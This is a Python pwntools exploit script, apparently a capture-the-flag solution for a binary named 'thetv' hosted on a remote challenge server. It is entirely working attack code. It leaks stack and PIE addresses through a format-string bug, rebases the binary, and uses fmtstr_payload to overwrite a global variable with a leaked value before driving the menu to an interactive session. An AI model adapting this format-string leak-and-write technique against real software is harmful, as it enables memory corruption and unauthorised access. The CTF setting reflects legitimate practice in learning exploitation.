from pwn import *
from icecream import ic

elf = exe = ELF("./thetv")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("0.cloud.chals.io", 30658)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *checkPin
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop {b}", "ret"])[0]
def i(): return io.interactive()

io = start()

sl(b'p')
sl(b'%13$p')
ru("You say: ")
leak = int(rl().strip(), 16)


ic(hex(leak))

sl(b'p')
sl(b'%31$p')
ru("You say: ")
elf.address = int(rl().strip(), 16) - elf.sym['main']

payload = fmtstr_payload(16, {elf.address+0x4070: leak}, write_size='short')
sl(b'p')
sl(payload)


sl(b'c')
sl(b'y')
sl(b'6')
sl(str(0x420).encode())
io.interactive()
